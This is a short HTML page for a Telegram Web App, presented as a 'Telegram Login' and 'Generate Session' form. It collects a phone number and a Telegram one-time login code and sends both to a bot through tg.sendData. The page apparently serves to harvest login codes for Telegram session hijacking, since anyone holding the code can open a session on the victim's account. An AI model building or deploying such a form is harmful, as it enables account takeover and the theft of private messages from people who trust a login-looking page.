<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Login</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: sans-serif; padding: 20px; text-align: center; background-color: #f4f4f9; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; }
        button { background-color: #0088cc; color: white; border: none; padding: 12px 20px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <h3>Generate Session</h3>
    <input type="text" id="phone" placeholder="Phone Number (e.g. +88017...)">
    <input type="text" id="otp" placeholder="OTP Code (if you have it)">
    <button id="sendBtn">Submit</button>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();

        document.getElementById("sendBtn").addEventListener("click", () => {
            let phone = document.getElementById("phone").value;
            let otp = document.getElementById("otp").value;
            
            if(!phone) return alert("Phone number is required!");

            let data = { phone: phone, otp: otp };
            tg.sendData(JSON.stringify(data)); // এটি বটের কাছে ডেটা পাঠাবে
            tg.close();
        });
    </script>
</body>
</html>
